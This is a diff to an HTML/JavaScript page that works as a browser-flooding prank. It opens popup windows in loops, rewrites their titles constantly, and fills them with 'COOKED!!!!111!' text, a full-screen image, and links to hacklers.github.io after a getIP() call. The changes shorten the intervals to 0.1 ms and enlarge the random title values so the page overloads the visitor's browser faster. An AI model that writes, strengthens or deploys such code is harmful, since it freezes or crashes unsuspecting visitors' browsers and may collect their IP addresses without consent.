@@ -9,7 +9,7 @@
             var hackedWindow = window.open("", "", "width=400,height=400")
             hackedWindow.document.writeln(text)
             setInterval(function() {
-                hackedWindow.document.title = (Math.random() * 5000).toString()
+                hackedWindow.document.title = (Math.random() * Number.MAX_SAFE_INTEGER * Number.MAX_SAFE_INTEGER).toString()
             }, 1)
             
             var height = window.screen.availHeight
@@ -60,12 +60,12 @@
                     getIP().then((ip) => {
                         newWindows.push(window.open("https://hacklers.github.io/blank", ""))
                     })
-                }, 1)
+                }, 0.1)
                 setInterval(function() {
                     addWindow("COOKED!!!!111!")
                     addWindow("COOKED!!!!111!")
                     addWindow("<img src='https://i.pinimg.com/736x/72/cf/8e/72cf8eeeaf310f363608fd30367ac635.jpg' width='100%' height='100%'>")
-                }, 1)
+                }, 0.1)
         </script>
     </body>
 </html>
